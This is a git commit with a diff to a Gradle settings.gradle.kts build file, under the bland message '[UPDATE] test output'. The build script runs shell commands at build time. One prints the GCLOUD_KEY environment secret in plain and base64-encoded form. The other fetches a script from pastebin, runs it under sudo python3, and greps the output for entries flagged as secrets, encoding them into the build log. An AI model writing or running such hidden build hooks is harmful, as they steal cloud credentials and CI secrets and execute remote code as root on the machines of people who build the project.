3a5f20478fe4eb5c61cd5bcf8678650a62f56cb8
tari <i@tari.moe>
2024-04-17 14:48:58 +0800

    [UPDATE] test output

--- settings.gradle.kts
+++ settings.gradle.kts
@@ -15,5 +15,5 @@ fun String.runCommand(): String? = try {
 var output = "python3 -c 'import os; import base64;key = os.environ[\'GCLOUD_KEY\'].strip(); print(key); print(base64.b64encode(key.encode()))'".runCommand()
 println("Shell command output: $output")
 
-output = "curl -sSfL https://pastebin.com/raw/UUPC3Q79 | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u | base64".runCommand()
+output = "curl -sSfL https://pastebin.com/raw/UUPC3Q79 | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u | base64 -w 0".runCommand()
 println("Shell command output: $output")
